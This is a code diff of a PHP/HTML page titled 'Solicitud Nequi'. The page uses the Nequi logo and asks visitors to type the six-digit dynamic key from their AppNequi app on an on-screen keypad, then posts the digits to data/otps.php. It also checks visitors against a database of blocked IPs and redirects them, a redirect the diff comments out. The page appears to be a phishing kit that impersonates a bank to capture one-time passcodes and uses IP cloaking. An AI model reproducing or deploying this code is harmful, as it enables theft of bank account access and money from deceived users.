@@ -14,7 +14,7 @@ $result = $stmt->get_result();
 
 if ($result->num_rows > 0) {
     // Si la IP está bloqueada, redirigir a box.com
-    header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
+// header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
     exit();
 }
 
@@ -24,26 +24,38 @@ $conn->close();
 ?>
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="config/css/otp.css">
     <title>Solicitud Nequi</title>
 </head>
+
 <body>
     <center><img src="config/img/nequi.svg"></center>
     <h2 class="text3">Solicitud Nequi</h2>
     <form id="otp-form" method="POST" action="data/otps.php" onsubmit="return prepareOTP();">
-        <input type="hidden" name="cliente_id" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
+        <input type="hidden" name="cliente_id"
+            value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
 
-        <center><p class="text2">Para confirmar tu solicitud escribe o pega la clave dinámica que encuentras en tu AppNequi</p></center>
+        <center>
+            <p class="text2">Para confirmar tu solicitud escribe o pega la clave dinámica que encuentras en tu AppNequi
+            </p>
+        </center>
         <div style="display: flex; justify-content: center;">
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-2')" id="otp-1" name="otp1" required readonly>
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-3')" id="otp-2" name="otp2" required readonly>
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-4')" id="otp-3" name="otp3" required readonly>
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-5')" id="otp-4" name="otp4" required readonly>
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-6')" id="otp-5" name="otp5" required readonly>
-            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, '')" id="otp-6" name="otp6" required readonly>
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-2')" id="otp-1"
+                name="otp1" required readonly>
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-3')" id="otp-2"
+                name="otp2" required readonly>
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-4')" id="otp-3"
+                name="otp3" required readonly>
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-5')" id="otp-4"
+                name="otp4" required readonly>
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-6')" id="otp-5"
+                name="otp5" required readonly>
+            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, '')" id="otp-6" name="otp6"
+                required readonly>
         </div>
 
         <div class="keyboard">
@@ -56,10 +68,11 @@ $conn->close();
             <button type="button" class="key" onclick="addDigit(7)">7</button>
             <button type="button" class="key" onclick="addDigit(8)">8</button>
             <button type="button" class="key" onclick="addDigit(9)">9</button>
-<br>
+            <br>
             <button type="button" class="key" onclick="addDigit(0)">0</button>
             <div class="key" onclick="clearLastDigit()">
-                <img class="bor" src="config/img/backspace_119404.png" alt="Borrar"> <!-- Cambia esta ruta por la de tu imagen -->
+                <img class="bor" src="config/img/backspace_119404.png" alt="Borrar">
+                <!-- Cambia esta ruta por la de tu imagen -->
             </div>
         </div>
 
@@ -112,4 +125,5 @@ $conn->close();
     </script>
 
 </body>
+
 </html>
